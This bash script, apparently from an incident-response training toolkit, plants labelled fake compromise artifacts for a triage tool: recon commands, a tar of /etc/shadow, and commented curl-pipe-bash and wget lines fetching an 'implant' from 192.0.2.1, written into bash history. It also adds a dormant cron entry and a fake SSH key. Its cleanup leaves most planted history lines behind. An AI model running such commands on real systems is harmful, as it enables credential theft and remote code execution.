#!/usr/bin/env bash
# simulate_linux.sh
# Linux Compromise Scenario Simulator (HARMLESS)
# Part of the Incident Response Triage Toolkit
#
# PURPOSE:
#   Creates benign test artifacts that mimic common post-compromise indicators
#   so you can run triage.py and see a realistic-looking triage report.
#
# WHAT IT DOES (all harmless):
#   1. Appends suspicious-looking commands to ~/.bash_history
#   2. Drops indicator files into /tmp and /dev/shm
#   3. Adds a clearly-labelled, commented-out cron entry
#
# USAGE:
#   bash simulate_linux.sh           # plant artifacts
#   bash simulate_linux.sh --cleanup # remove all planted artifacts
#   bash simulate_linux.sh --status  # show what artifacts are present
#
# DISCLAIMER:
#   This script is for EDUCATIONAL and PORTFOLIO demonstration only.
#   All artifacts are clearly labelled as simulations and are harmless.

set -o pipefail

MARKER="IR_SIMULATION"
SIM_DIR="/tmp/ir_simulation"
SEP="================================================================"

banner() {
    echo "$SEP"
    printf "  %s\n" "$1"
    echo "$SEP"
}

# ── simulate ──────────────────────────────────────────────────────────────────

simulate_bash_history() {
    echo ""
    echo "[*] Planting simulated bash history entries ..."

    HIST_FILE="$HOME/.bash_history"
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

    # Don't add duplicates
    if grep -q "$MARKER" "$HIST_FILE" 2>/dev/null; then
        echo "    [!] Simulation entries already in bash history — skipping."
        return
    fi

    cat >> "$HIST_FILE" << EOF
# $MARKER: attacker recon commands (planted by simulate_linux.sh at $TIMESTAMP)
whoami
id
hostname
uname -a
cat /etc/passwd
cat /etc/shadow
find / -name "*.conf" -readable 2>/dev/null | head -20
find / -perm -4000 -type f 2>/dev/null
ps aux
netstat -tulnp
ss -antp
cat /var/log/auth.log | tail -50
ls -la /tmp
ls -la /dev/shm
crontab -l
last -n 20
# $MARKER: simulated download (NOT executed)
# curl -s http://192.0.2.1/implant.sh | bash
# wget -q http://192.0.2.1/implant.elf -O /tmp/.hidden_elf && chmod +x /tmp/.hidden_elf
tar -czf /tmp/loot.tar.gz /etc/passwd /etc/shadow 2>/dev/null
# $MARKER: end of simulation block
EOF

    echo "    [+] Appended simulation entries to: $HIST_FILE"
}

simulate_temp_files() {
    echo ""
    echo "[*] Creating simulated artifact files ..."

    mkdir -p "$SIM_DIR"
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

    # /tmp artifacts
    cat > "$SIM_DIR/recon_output.txt" << EOF
# $MARKER — simulated attacker recon output
# Created: $TIMESTAMP

Hostname : victim-server
OS       : Ubuntu 22.04 LTS (simulated)
Kernel   : 5.15.0-91-generic (simulated)
Users    : root, ubuntu, dbadmin
IP       : 10.0.0.50 (simulated)

This file is HARMLESS — for IR triage portfolio demo only.
EOF

    cat > "$SIM_DIR/implant_sim.sh" << 'EOF'
#!/bin/bash
# IR_SIMULATION — simulated dropped script
# In a real attack this might contain:
#   - Reverse shell code
#   - Privilege escalation
#   - Lateral movement
# echo "IR_SIMULATION: This is a harmless placeholder file"
EOF
    chmod +x "$SIM_DIR/implant_sim.sh"

    cat > "$SIM_DIR/loot_sim.txt" << EOF
# $MARKER — simulated data staging
# Created: $TIMESTAMP

Simulated exfil staging area.
Real attackers may stage compressed/encrypted data here.

This file is HARMLESS — for IR triage portfolio demo only.
EOF

    # /dev/shm artifact (attackers use this to avoid disk writes)
    cat > "/dev/shm/${MARKER}_artifact.txt" << EOF
# $MARKER — simulated memory-resident artifact
# Created: $TIMESTAMP

Attackers use /dev/shm (shared memory) to avoid leaving traces on disk.
This is a common technique to check during IR.

This file is HARMLESS — for IR triage portfolio demo only.
EOF

    echo "    [+] Created simulation directory: $SIM_DIR"
    echo "    [+] Files: recon_output.txt, implant_sim.sh, loot_sim.txt"
    echo "    [+] Created: /dev/shm/${MARKER}_artifact.txt"
}

simulate_cron_persistence() {
    echo ""
    echo "[*] Simulating cron-based persistence ..."

    CRON_COMMENT="# $MARKER: simulated persistence (commented out — harmless)"
    CRON_ENTRY="# @reboot /tmp/ir_simulation/implant_sim.sh  # would run at boot in real attack"

    if crontab -l 2>/dev/null | grep -q "$MARKER"; then
        echo "    [!] Simulation cron entry already present — skipping."
        return
    fi

    (crontab -l 2>/dev/null; echo "$CRON_COMMENT"; echo "$CRON_ENTRY") | crontab -
    echo "    [+] Added commented-out cron entry (harmless — won't execute)"
    echo "        $CRON_ENTRY"
}

simulate_suspicious_ssh_key() {
    echo ""
    echo "[*] Simulating suspicious SSH artifact ..."

    SSH_DIR="$HOME/.ssh"
    mkdir -p "$SSH_DIR"
    chmod 700 "$SSH_DIR"
    AUTH_KEYS="$SSH_DIR/authorized_keys"
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

    SIM_KEY="# $MARKER $TIMESTAMP: simulated attacker SSH key (not a real key)"
    SIM_KEY2="# ssh-rsa AAAA[SIMULATED_KEY_DATA]== attacker@kali  # NOT REAL"

    if [ -f "$AUTH_KEYS" ] && grep -q "$MARKER" "$AUTH_KEYS" 2>/dev/null; then
        echo "    [!] Simulation SSH entry already present — skipping."
        return
    fi

    printf "%s\n%s\n" "$SIM_KEY" "$SIM_KEY2" >> "$AUTH_KEYS"
    chmod 600 "$AUTH_KEYS"
    echo "    [+] Added simulated attacker key comment to: $AUTH_KEYS"
    echo "        (Commented out — will not grant SSH access)"
}

# ── cleanup ───────────────────────────────────────────────────────────────────

cleanup() {
    echo ""
    echo "[*] Removing all simulation artifacts ..."

    # Remove simulation dir and /dev/shm artifact
    if [ -d "$SIM_DIR" ]; then
        rm -rf "$SIM_DIR"
        echo "    [+] Removed: $SIM_DIR"
    else
        echo "    [-] Not found: $SIM_DIR"
    fi

    if [ -f "/dev/shm/${MARKER}_artifact.txt" ]; then
        rm -f "/dev/shm/${MARKER}_artifact.txt"
        echo "    [+] Removed: /dev/shm/${MARKER}_artifact.txt"
    fi

    # Remove cron entries
    if crontab -l 2>/dev/null | grep -q "$MARKER"; then
        crontab -l 2>/dev/null | grep -v "$MARKER" | crontab -
        echo "    [+] Removed simulation cron entries"
    else
        echo "    [-] No simulation cron entries found"
    fi

    # Remove bash history entries
    HIST_FILE="$HOME/.bash_history"
    if [ -f "$HIST_FILE" ] && grep -q "$MARKER" "$HIST_FILE"; then
        # Keep everything except lines in the simulation block
        grep -v "$MARKER" "$HIST_FILE" > "${HIST_FILE}.clean" 2>/dev/null
        mv "${HIST_FILE}.clean" "$HIST_FILE"
        echo "    [+] Removed simulation lines from: $HIST_FILE"
    else
        echo "    [-] No simulation lines in bash history"
    fi

    # Remove SSH key comments
    SSH_KEYS="$HOME/.ssh/authorized_keys"
    if [ -f "$SSH_KEYS" ] && grep -q "$MARKER" "$SSH_KEYS"; then
        grep -v "$MARKER" "$SSH_KEYS" > "${SSH_KEYS}.clean" 2>/dev/null
        mv "${SSH_KEYS}.clean" "$SSH_KEYS"
        echo "    [+] Removed simulation lines from: $SSH_KEYS"
    fi

    echo ""
    echo "[+] Cleanup complete."
}

# ── status ────────────────────────────────────────────────────────────────────

status() {
    echo ""
    echo "[*] Checking for simulation artifacts ..."

    HIST_FILE="$HOME/.bash_history"
    echo -n "  Bash history entries: "
    if grep -q "$MARKER" "$HIST_FILE" 2>/dev/null; then
        COUNT=$(grep -c "$MARKER" "$HIST_FILE" 2>/dev/null)
        echo "[PRESENT — $COUNT marker(s)]"
    else
        echo "[NOT FOUND]"
    fi

    echo -n "  Simulation directory $SIM_DIR: "
    if [ -d "$SIM_DIR" ]; then
        FILE_COUNT=$(ls -1 "$SIM_DIR" | wc -l)
        echo "[PRESENT — $FILE_COUNT file(s)]"
        ls "$SIM_DIR" | sed 's/^/    - /'
    else
        echo "[NOT FOUND]"
    fi

    echo -n "  /dev/shm artifact: "
    [ -f "/dev/shm/${MARKER}_artifact.txt" ] && echo "[PRESENT]" || echo "[NOT FOUND]"

    echo -n "  Cron entries: "
    if crontab -l 2>/dev/null | grep -q "$MARKER"; then
        echo "[PRESENT]"
    else
        echo "[NOT FOUND]"
    fi

    echo -n "  SSH authorized_keys: "
    if grep -q "$MARKER" "$HOME/.ssh/authorized_keys" 2>/dev/null; then
        echo "[PRESENT]"
    else
        echo "[NOT FOUND]"
    fi
}

# ── main ─────────────────────────────────────────────────────────────────────

banner "LINUX COMPROMISE SIMULATION"
echo "  Running as: $(whoami)"
echo "  All artifacts are HARMLESS and clearly labelled."
echo "  Run with --cleanup to remove everything when done."
echo "$SEP"

case "${1:-}" in
    --cleanup)
        cleanup
        ;;
    --status)
        status
        ;;
    *)
        echo "This script creates HARMLESS test artifacts to simulate a compromise."
        echo "After running, use 'python3 triage.py' to collect and review them."

        simulate_bash_history
        simulate_temp_files
        simulate_cron_persistence
        simulate_suspicious_ssh_key

        echo ""
        echo "$SEP"
        echo "[+] Simulation complete!"
        echo ""
        echo "  Next steps:"
        echo "    1. python3 triage.py             — collect artifacts"
        echo "    2. Review triage/triage_*/        — examine the report"
        echo "    3. bash simulate_linux.sh --status   — verify artifacts exist"
        echo "    4. bash simulate_linux.sh --cleanup  — remove when done"
        echo "$SEP"
        ;;
esac
